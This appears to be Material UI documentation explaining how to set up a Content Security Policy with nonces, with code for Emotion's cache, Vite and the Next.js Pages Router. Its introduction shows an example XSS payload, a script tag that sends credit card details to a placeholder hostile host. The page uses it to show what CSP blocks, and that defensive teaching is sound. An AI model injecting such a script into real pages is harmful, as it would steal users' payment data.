# Content Security Policy (CSP)

<p class="description">This section covers the details of setting up a CSP.</p>

## What is CSP and why is it useful?

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).

## How does one implement CSP?

### Server-Side Rendering (SSR)

To use CSP with Material UI (and Emotion), you need to use a nonce.
A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

You must use UUID version 4, as it generates an **unpredictable** string.
You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tags on the server.

```jsx
<style
  data-emotion={`${style.key} ${style.ids.join(' ')}`}
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: style.css }}
/>
```

Then, you must pass this nonce to Emotion's cache so it can add it to subsequent `<style>`.

:::warning
If you were using `StyledEngineProvider` with `injectFirst`, you will need to replace it with `CacheProvider` from Emotion and add the `prepend: true` option.
:::

```js
const cache = createCache({
  key: 'my-prefix-key',
  nonce: nonce,
  prepend: true,
});

function App(props) {
  return (
    <CacheProvider value={cache}>
      <Home />
    </CacheProvider>
  );
}
```

### CSP in Vite

When deploying a CSP using Vite, there are specific configurations you must set up due to Vite's internal handling of assets and modules.
See [Vite Features—Content Security Policy](https://vite.dev/guide/features.html#content-security-policy-csp) for complete details.

### Next.js Pages Router

For the Next.js Pages Router, after [setting up a nonce](https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy#nonces), pass it to the Emotion cache in two places:

1. In `_document.tsx`:

```tsx
import {
  DocumentHeadTags,
  documentGetInitialProps,
  createEmotionCache,
} from '@mui/material-nextjs/v15-pagesRouter';
// other imports

type Props = DocumentInitialProps & DocumentHeadTagsProps & { nonce?: string };

export default function MyDocument(props: Props) {
  const { nonce } = props;

  return (
    <Html lang="en" className={roboto.className}>
      <Head>
        {/*...*/}
        <meta name="csp-nonce" content={nonce} />
        <DocumentHeadTags {...props} nonce={nonce} />
      </Head>
      <body>
        {/*...*/}
        <NextScript nonce={nonce} />
      </body>
    </Html>
  );
}

MyDocument.getInitialProps = async (ctx: DocumentContext) => {
  const { req } = ctx;
  const nonce = req?.headers['x-nonce'];
  if (typeof nonce !== 'string') {
    throw new Error('"nonce" header is missing');
  }

  const emotionCache = createEmotionCache({ nonce });
  const finalProps = await documentGetInitialProps(ctx, {
    emotionCache,
  });

  return { ...finalProps, nonce };
};
```

2. In `_app.tsx` (if you're setting up the `AppCacheProvider`):

```tsx
import { createEmotionCache } from '@mui/material-nextjs/v15-pagesRouter';
// other imports

export default function MyApp(props: AppProps & { nonce: string }) {
  const { Component, pageProps, nonce } = props;

  const emotionCache = useMemo(() => {
    const nonce = props.nonce || getNonce();

    return createEmotionCache({ nonce });
  }, [props.nonce]);

  return (
    <AppCacheProvider {...props} emotionCache={emotionCache}>
      {/* ... */}
    </AppCacheProvider>
  );
}

function getNonce(headers?: Record<string, string | string[] | undefined>) {
  if (headers) {
    return headers['x-nonce'] as string;
  }

  if (typeof document !== 'undefined') {
    const nonceMeta = document.querySelector('meta[name="csp-nonce"]');
    if (nonceMeta) {
      return nonceMeta.getAttribute('content') || undefined;
    }
  }

  return undefined;
}

MyApp.getInitialProps = async (appContext: AppContext) => {
  const nonce = getNonce(appContext.ctx?.req?.headers);
  if (typeof nonce !== 'string') {
    throw new Error('"nonce" header is missing');
  }

  return { ...otherProps, nonce };
};
```

### styled-components

The configuration of the nonce is not straightforward, but you can follow [this issue](https://github.com/styled-components/styled-components/issues/2363) for more insights.
